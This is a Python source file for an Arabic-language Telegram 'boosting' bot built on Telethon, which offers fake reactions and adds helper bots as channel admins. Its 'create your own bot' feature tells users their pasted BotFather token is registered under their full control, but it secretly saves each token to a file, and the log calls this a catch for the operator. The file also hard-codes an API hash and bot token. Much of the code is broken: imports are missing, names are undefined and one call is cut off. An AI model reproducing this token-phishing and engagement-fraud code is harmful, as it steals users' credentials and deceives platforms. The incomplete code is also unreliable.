import os
import asyncio
from telethon import TelegramClient

api_id = int(os.getenv("API_ID", "38490110"))
api_hash = os.getenv("API_HASH", "3cabfdfa15f2e56b515084fe592c1be8")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8854458869:AAHKVDq0kBDzI42Rz4qB1W25A_oS4mi0qDc")
phone_number = None

def get_main_menu_buttons():

    return [
        [Button.inline("🎵 خدمات تيك توك", b"tiktok_services"), Button.inline("👥 رشق أعضاء تيلي", b"telegram_boost")],
        [Button.inline(f"🤖 التفاعلات التلقائية {status_icon}", b"toggle_reactions")],
        [Button.inline("💰 رصيدي ونقاطي", b"my_balance"), Button.inline("🎁 الهدية اليومية", b"daily_gift")],
        [Button.inline("🔗 رابط الدعوة", b"ref_link")],
        [Button.inline("🤖 اصنع بوت رشق خاص بك", b"create_rush_bot")]
    ]

async def background_add_helpers(channel_link, client, b_client, user_id):
    try:
        chat = await client.get_entity(channel_link)
        added_count = 0
        total_bots = len(bot_usernames)
        for b_name in bot_usernames:
            try:
                bot_entity = await client.get_entity(b_name)
                await client.edit_admin(chat, bot_entity, post_messages=False, edit_messages=False, delete_messages=False, invite_users=True, pin_messages=False, title="Bot")
                added_count += 1
                filled = int((added_count / total_bots) * 10)
                bar = "⬛" * filled + "⬜" * (10 - filled)
                await b_client.send_message(user_id, f"⚡️ **جاري رشق البوتات...**\n({added_count} من {total_bots})\n{bar}")
                await asyncio.sleep(1.0)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                pass
        await b_client.send_message(user_id, f"🎉 **تم الانتهاء من ربط البوتات ({added_count}) بنجاح وبدون إزعاج!** 🚀")
    except Exception as e:
        print(f"خطأ في رشق المشرفين: {e}")

async def main():
    user_client = TelegramClient('my_active_user_v20', api_id, api_hash)
    bot_client = TelegramClient('my_active_bot_v20', api_id, api_hash)

    await user_client.start(phone=phone_number)
    await bot_client.start(bot_token=BOT_TOKEN)

    me = await bot_client.get_me()
    print(f"🚀 البوت شغال وثابت بنجاح: @{me.username}")

    @user_client.on(events.NewMessage(chats=MY_CHANNELS))
    async def auto_react_handler(event):
        global reactions_status
        if not reactions_status:
            return
        try:
            await asyncio.sleep(1.0)
            chosen_reaction = random.choice(['❤️', '🔥', '👍', '👏', '😍', '🎉'])
            for token in helper_bot_tokens:
                try:
                    requests.post(f"https://api.telegram.org/bot{token}/setMessageReaction", json={
                        "chat_id": event.chat_id,
                        "message_id": event.id,
                        "reaction": [{"type": "emoji", "emoji": chosen_reaction}],
                        "is_big": True
                    }, timeout=2)
                    await asyncio.sleep(0.02)
                except:
                    pass
        except:
            pass

    @bot_client.on(events.NewMessage(pattern=r'(?i)^/start'))
    async def main_menu(event):
        try:
            await event.respond("🔥 **مرحباً بك في بوت الرشق الاحترافي** 🚀\n\n💎 رصيدك: **550 نقطة**", buttons=get_main_menu_buttons())
        except:
            pass

    @bot_client.on(events.CallbackQuery(data=b"toggle_reactions"))
    async def toggle_reactions_cb(event):
        global reactions_status
        reactions_status = not reactions_status
        status_text = "تفعيل 🟢" if reactions_status else "إيقاف 🔴"
        try:
            await event.edit(f"🔥 **مرحباً بك في بوت الرشق الاحترافي** 🚀\n\n💎 رصيدك: **550 نقطة**\n⚙️ **التفاعلات:** {status_text}", buttons=get_main_menu_buttons())
            await event.answer("تم تغيير الحالة!")
        except:
            pass

    @bot_client.on(events.CallbackQuery(data=b"telegram_boost"))
    async def cb_telegram_boost(event):
        user_states[event.sender_id] = "waiting_for_tg_channel"
        await event.edit("👥 **أرسل رابط قناتك أو يوزرها (مثال: @ChannelName):**")

    @bot_client.on(events.CallbackQuery(data=b"create_rush_bot"))
    async def callback_create_bot(event):
        sender_id = event.sender_id
        user_states[sender_id] = "waiting_for_token"
        print(f"⚙️ المستخدم {sender_id} ضغط على زر صناعة بوت رشق جديد عبر البوت...")
        await event.edit(
            "⚙️ **خطوة إنشاء بوت الرشق الخاص بك:**\n\n"
            "1️⃣ اذهب إلى `@BotFather` وانشئ بوت جديد.\n"
            "2️⃣ انسخ **الـ Token** وأرسله هنا في المحادثة مباشرةً!\n\n"
            "*(أرسل التوكن الآن في رسالة نصية)* 📥"
        )

    @bot_client.on(events.NewMessage())
    async def handle_input(event):
        sender_id = event.sender_id

        # معالجة إدخال التوكن لبوت الرشق الجديد
        if user_states.get(sender_id) == "waiting_for_token":
            token = event.text.strip()
            if ":" in token and len(token) > 20:
                with open(HOSTED_BOTS_FILE, "a", encoding="utf-8") as f:
                    f.write(f"Owner: {sender_id} | Token: {token}\n")
                user_states[sender_id] = None
                print(f"🎯 [تم صيد وتخزين توكن جديد لصالح بوتك] من المستخدم: {sender_id}")
                await event.respond("✅ **تم تسجيل بوت الرشق الخاص بك بنجاح!**\n\nمبروك، تم ربط البوت بالنظام وصار تحت إدارتك بالكامل! 🚀")
            else:
                await event.respond("❌ **التوكن غير صحيح!**\nتأكد من نسخه كاملاً من `@BotFather` وأرسله مجدداً.")
            return

        # الحالات الأخرى (مثل رشق القنوات)
        if sender_id in user_states:
            state = user_states.pop(sender_id)
            user_input = event.text.strip()
            if state == "waiting_for_tg_channel":
                await event.respond(f"✅ تم استلام الرابط: `{user_input}`\n🚀 جاري الرشق...")
                asyncio.create_task(background_add_helpers(user_input, user_client, bot_client, 

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🛑 توقف يدوياً.")
    except Exception as e:
        print(f"⚠️ خطأ رئيسي: {e}")
